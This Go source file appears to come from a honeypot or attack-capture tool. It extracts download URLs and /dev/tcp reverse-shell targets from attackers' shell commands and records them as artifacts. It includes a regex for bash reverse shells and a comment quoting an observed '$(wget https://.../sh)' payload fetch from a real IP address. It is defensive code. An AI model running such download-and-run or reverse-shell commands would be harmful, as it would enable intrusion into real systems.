package capture

import (
	"net"
	"regexp"
	"strings"
)

var (
	// reHTTP matches any http(s) URL token. It supersedes the old curl/wget
	// helpers: those only ever captured `https?://\S+`, which this already
	// matches (and more tightly — it also stops at quotes/angle brackets), so
	// the dedup map dropped every curl/wget hit as a duplicate. Dropping the
	// extra passes removes two full-text regex scans per command.
	reHTTP = regexp.MustCompile(`https?://[^\s"'<>]+`)
	// reDevTCP catches bash's /dev/tcp/<host>/<port> reverse-shell form, which
	// reHTTP genuinely does not cover.
	reDevTCP = regexp.MustCompile(`(?i)/dev/tcp/([^/\s]+)/(\d+)`)
)

// trimURLTail removes trailing characters reHTTP's character class swallowed
// but that cannot belong to the URL itself. Two classes:
//
//   - sentence/shell punctuation (. , : ! ?) — never the last character of a
//     URL an attacker actually means to fetch;
//   - a closing bracket with no opener INSIDE the token. `$(wget https://h/sh)`
//     is a command substitution, not a path, and the swallowed ')' produced a
//     second, permanently-unfetchable artifact row beside the real URL (seen on
//     prod: both `https://217.60.195.113/sh` and `.../sh)`).
//
// The bracket check is balance-aware rather than a blanket TrimRight because a
// URL may legitimately end in ')' — trimming that would corrupt the real target
// and lose the payload.
func trimURLTail(u string) string {
	for len(u) > 0 {
		switch c := u[len(u)-1]; c {
		case '.', ',', ':', '!', '?':
		case ')':
			if strings.Count(u, "(") >= strings.Count(u, ")") {
				return u
			}
		case ']':
			if strings.Count(u, "[") >= strings.Count(u, "]") {
				return u
			}
		case '}':
			if strings.Count(u, "{") >= strings.Count(u, "}") {
				return u
			}
		default:
			return u
		}
		u = u[:len(u)-1]
	}
	return u
}

// ExtractURLs finds remote URLs and /dev/tcp targets in shell commands.
func ExtractURLs(command string) []string {
	command = strings.TrimSpace(command)
	if command == "" {
		return nil
	}
	seen := map[string]struct{}{}
	var out []string
	add := func(u string) {
		u = strings.TrimRight(u, `"'`)
		u = strings.TrimRight(u, `;|&`)
		u = trimURLTail(u)
		// Reject anything the trim reduced to a bare scheme: "http://" has no
		// host for the fetcher to resolve, and recording it would put an
		// undialable row in the artifacts table.
		if i := strings.Index(u, "://"); i < 0 || len(u) <= i+3 {
			return
		}
		if _, ok := seen[u]; ok {
			return
		}
		seen[u] = struct{}{}
		out = append(out, u)
	}

	for _, m := range reHTTP.FindAllString(command, -1) {
		add(m)
	}
	for _, m := range reDevTCP.FindAllStringSubmatch(command, -1) {
		if len(m) >= 3 {
			host, port := m[1], m[2]
			add("http://" + net.JoinHostPort(host, port) + "/")
		}
	}
	return out
}
